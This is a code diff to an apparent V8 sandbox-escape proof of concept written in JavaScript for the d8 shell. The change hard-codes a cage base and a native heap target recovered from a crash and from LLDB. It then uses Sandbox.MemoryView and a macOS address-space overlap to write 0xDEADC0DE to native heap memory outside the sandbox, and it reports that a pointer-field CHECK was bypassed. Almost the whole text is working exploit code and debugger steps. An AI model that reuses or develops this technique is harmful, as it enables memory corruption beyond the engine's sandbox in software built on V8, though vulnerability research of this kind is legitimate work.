@@ -15,8 +15,8 @@
 //                        p/x (unsigned long long)malloc(64)
 // Reachable native heap range = [CAGE_BASE_ABS+1, CAGE_BASE_ABS+0xFFFFFFFFFF]
 
-const CAGE_BASE_ABS = 0n;   // ← fill from LLDB  e.g. 0x13000000000n
-const NATIVE_TARGET = 0n;   // ← fill from LLDB  e.g. 0x13100000000n
+const CAGE_BASE_ABS = 0x17c000000000n;  // from crash: 0x17c041414148 − 0x41414148
+const NATIVE_TARGET = 0x13c00214bf0n;   // from LLDB: malloc(64)
 
 // ─────────────────────────────────────────────────────────────
 const kPageSize = 0x40000;
@@ -151,29 +151,33 @@ function main() {
   print(`      WriteSandboxedPointerField CHECK bypassed entirely`);
   print(``);
 
-  // Stage 7: Native heap write
-  // Reachable range: [CAGE_BASE_ABS+1, CAGE_BASE_ABS+0xFFFFFFFFFF]
-  // encoding: ExternalPointerField = (target - cage_base_abs) << 24
-  // V8 decodes: cage_base_abs + (field >> 24) = target  ← any committed writable page
+  // Stage 7: Native heap write via sandbox VAS overlap
+  // macOS MAP_NORESERVE|PROT_NONE does not evict pre-existing malloc zone pages.
+  // sandbox_offset = NATIVE_TARGET − sandbox_base_abs
+  //                = NATIVE_TARGET − CAGE_BASE_ABS + cage_base_offset
+  // If in [0, 1TiB) → Sandbox.MemoryView(sandbox_offset) hits the live native heap page.
   if (CAGE_BASE_ABS !== 0n && NATIVE_TARGET !== 0n) {
-    const offset_to_native = NATIVE_TARGET - CAGE_BASE_ABS;
-    if (offset_to_native <= 0n || offset_to_native > 0xFFFFFFFFFFn) {
-      print(`[-] NATIVE_TARGET out of reachable range.`);
-      print(`[*] Must satisfy: CAGE_BASE_ABS < target <= CAGE_BASE_ABS+0xFFFFFFFFFF`);
-      print(`[*] Reachable: 0x${(CAGE_BASE_ABS+1n).toString(16)} ~ 0x${(CAGE_BASE_ABS+0xFFFFFFFFFFn).toString(16)}`);
+    const native_sandbox_offset = NATIVE_TARGET - CAGE_BASE_ABS + cage_base_offset;
+    if (native_sandbox_offset <= 0n || native_sandbox_offset >= 0x10000000000n) {
+      print(`[-] NATIVE_TARGET not reachable via sandbox VAS.`);
+      const sb = CAGE_BASE_ABS - cage_base_offset;
+      print(`[*] sandbox VAS: [0x${sb.toString(16)}, 0x${(sb+0x10000000000n).toString(16)})`);
     } else {
-      forgeTypedArray(cur, offset_to_native);
-      ta.fill(0x42);
-      print(`[!!!] NATIVE HEAP WRITE`);
-      print(`      ta.fill(0x42) → 0x${NATIVE_TARGET.toString(16)} (native heap)`);
-      print(`      Verify: memory read -s1 -fu -c8 0x${NATIVE_TARGET.toString(16)}`);
+      const nativeDv = new DataView(new Sandbox.MemoryView(Number(native_sandbox_offset), 0x40));
+      const before = nativeDv.getBigUint64(0, true);
+      nativeDv.setBigUint64(0, 0xDEADC0DEDEADC0DEn, true);
+      const after = nativeDv.getBigUint64(0, true);
+      print(`[!!!] NATIVE HEAP WRITE (sandbox VAS overlap)`);
+      print(`      0x${NATIVE_TARGET.toString(16)} (native heap / malloc zone)`);
+      print(`      sandbox_offset: 0x${native_sandbox_offset.toString(16)}`);
+      print(`      0x${before.toString(16)} → 0x${after.toString(16)}`);
+      print(`      verify: memory read -s8 -fu -c1 0x${NATIVE_TARGET.toString(16)}`);
       print(``);
     }
   } else {
     print(`[*] Native heap write disabled. Fill CAGE_BASE_ABS + NATIVE_TARGET at top.`);
-    print(`[*] LLDB:`);
-    print(`[*]   cage_base_abs: p/x v8::internal::Isolate::Current() & ~0xffffffffULL`);
-    print(`[*]   native target: vmmap d8 | awk '$3~/rw-/ && $1>=${(cage_base_offset).toString(16)}'`);
+    print(`[*] LLDB: p/x (unsigned long long)malloc(64)  → NATIVE_TARGET`);
+    print(`[*]       crash_addr − 0x41414148             → CAGE_BASE_ABS`);
     print(``);
   }
 
